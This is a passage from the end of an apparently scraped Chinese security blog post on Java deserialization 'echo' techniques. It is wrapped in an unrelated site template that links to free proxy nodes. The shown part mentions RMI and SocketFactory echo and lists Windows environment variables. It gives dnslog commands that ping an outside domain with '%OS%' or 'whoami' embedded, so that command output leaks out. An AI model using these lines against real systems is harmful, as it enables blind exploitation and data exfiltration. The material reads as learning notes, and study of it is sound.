alt="java序列回显学习"></p> <p>SocketFactory类</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/9f0194938b488a4aa8c428dc975b0740.jpg" alt="java序列回显学习"></p> <p>最后成功了</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/96e4803b02be45646451a5b3fc0b3889.jpg" alt="java序列回显学习"></p> <h2 id="6中间件回显">6、中间件回显</h2> <p>中间件回显我们另开篇章学习</p> <h2 id="7写文件dnslog">7、写文件、dnslog</h2> <p>这两种都比较简单，写文件主要是搜索一些特殊的静态文件，然后将结果写入文件,dnslog如下</p> <p><strong>dnslog</strong></p> <pre><code class="language-java">//windows ping %OS%.ijowns.dnslog.cn //linux ping -c 1 `whoami`.niddp9.dnslog.cn</code></pre> <pre><code>变量                                           类型       描述 %USERNAME%                                     返回当前登录的用户的名称。 %USERDOMAIN%                                   返回包含用户帐户的域的名称。 %OS%                                           返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。 %USERPROFILE%                                  返回当前用户的配置文件的位置。 %ALLUSERSPROFILE%                           返回“所有用户”配置文件的位置。 %APPDATA%               　　                返回默认情况下应用程序存储数据的位置。 %CD%                                       返回当前目录字符串。 %CMDCMDLINE%                                    返回用来启动当前的 Cmd.exe 的准确命令行。 %CMDEXTVERSION%                              返回当前的“命令处理程序扩展”的版本号。 %COMPUTERNAME%                                返回计算机的名称。 %COMSPEC%                                            返回命令行解释器可执行程序的准确路径。 %DATE%                                                  返回当前日期。 %ERRORLEVEL%                                  返回上一条命令的错误代码。通常用非零值表示错误。 %HOMEDRIVE%                                           返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMEPATH%                                             返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %HOMESHARE%                                           返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。 %LOGONSERVER%                                      返回验证当前登录会话的域控制器的名称。 %NUMBER_OF_PROCESSORS%                 指定安装在计算机上的处理器的数目。 %PATH%                                          指定可执行文件的搜索路径。 %PATHEXT%                                                 返回操作系统认为可执行的文件扩展名的列表。 %PROCESSOR_ARCHITECTURE%              返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。 %PROCESSOR_IDENTFIER%                    返回处理器说明。 %PROCESSOR_LEVEL%                            返回计算机上安装的处理器的型号。 %PROCESSOR_REVISION%                       返回处理器的版本号。 %PROMPT%                                           返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。 %RANDOM%                                          返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。 %SYSTEMDRIVE%                                  返回 Windows server operating system 根目录的位置。 %TEMP%和%TMP%                                 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。 %TIME%                                         返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。 %WINDIR%                                       返回操作系统目录的位置</code></pre> <h2 id="8结束">8、结束</h2> <p>在rmi绑定回显最后测试卡了很久，最后还是请教了y4er师傅,反写师傅的指导，总结一句就是不够细心、不够细心、不够细心。</p> <p>参考</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://y4er.com/post/weblogic-uses-classloader-and-rmi-to-display-command-execution-results/"  target="_blank" rel="nofollow">https://y4er.com/post/weblogic-uses-classloader-and-rmi-to-display-command-execution-results/</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://github.com/5up3rc/weblogic_cmd/"  target="_blank" rel="nofollow">https://github.com/5up3rc/weblogic_cmd/</a></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-44684.htm">宠物店一个月能卖多少狗粮啊 宠物店一个月能卖多少狗粮啊视频</a></p>
+                                        <p>下一个：<a href="/news/article-45179.htm">为啥家猫不需要打疫苗宠物猫要打呢（家猫为什么不用打疫苗）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/free-nodes/2024-11-1-free-v2ray-subscribe.htm" title="「11月1日」最高速度22.1M/S，2024年V2ray/Clash/SSR/Shadowrocket每天更新免费节点订阅链接">「11月1日」最高速度22.1M/S，2024年V2ray/Clash/SSR/Shadowrocket每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-26-clash-node-daily-updates.htm" title="「11月26日」最高速度18M/S，2024年Clash/Shadowrocket/SSR/V2ray每天更新免费节点订阅链接">「11月26日」最高速度18M/S，2024年Clash/Shadowrocket/SSR/V2ray每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-17-free-node-subscribe.htm" title="「11月17日」最高速度22.9M/S，2024年SSR/Clash/V2ray/Shadowrocket每天更新免费节点订阅链接">「11月17日」最高速度22.9M/S，2024年SSR/Clash/V2ray/Shadowrocket每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-39233.htm" title="全国动物疫苗生产厂家有哪些公司呢（国内动物疫苗龙头企业）">全国动物疫苗生产厂家有哪些公司呢（国内动物疫苗龙头企业）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-3-free-v2ray-subscribe.htm" title="「11月3日」最高速度19.7M/S，2024年V2ray/SSR/Shadowrocket/Clash每天更新免费节点订阅链接">「11月3日」最高速度19.7M/S，2024年V2ray/SSR/Shadowrocket/Clash每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-24950.htm" title="宠物美容工资多少钱一个月（宠物美容师基本工资）">宠物美容工资多少钱一个月（宠物美容师基本工资）</a></li>
+                        <li class="py-2"><a href="/news/article-41189.htm" title="spring.profiles.active的使用">spring.profiles.active的使用</a></li>
+                        <li class="py-2"><a href="/news/article-32455.htm" title="成都兽用疫苗公司 成都兽用疫苗公司有哪些">成都兽用疫苗公司 成都兽用疫苗公司有哪些</a></li>
+                        <li class="py-2"><a href="/news/article-44684.htm" title="宠物店一个月能卖多少狗粮啊 宠物店一个月能卖多少狗粮啊视频">宠物店一个月能卖多少狗粮啊 宠物店一个月能卖多少狗粮啊视频</a></li>
+                        <li class="py-2"><a href="/news/article-19891.htm" title="DeferredResult异步处理spring mvc Demo">DeferredResult异步处理spring mvc Demo</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">72</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">34</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ========================= about style-3 end ========================= -->
+        <footer class="footer footer-style-1">
+        <div class="container">
+            <div class="copyright-wrapper wow fadeInUp" data-wow-delay=".2s">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                <p>MyClash官网每日更新站 版权所有 Powered by WordPress</p>
+            </div>
+        </div>
+    </footer>
+    <!-- ========================= footer style-1 end ========================= -->
+    <!-- ========================= scroll-top start ========================= -->
+    <a href="#" class="scroll-top"> <i class="lni lni-chevron-up"></i> </a>
+    <!-- ========================= scroll-top end ========================= -->
+    <!-- ========================= JS here ========================= -->
+    <script src="/assets/website/js/frontend/myclash/jquery-3.4.1.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/bootstrap.5.0.0.alpha-2-min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/contact-form.js"></script>
+    <script src="/assets/website/js/frontend/myclash/tiny-slider.js"></script>
+    <script src="/assets/website/js/frontend/myclash/glightbox.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/imagesloaded.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/isotope.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/count-up.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/myclash/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script><script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
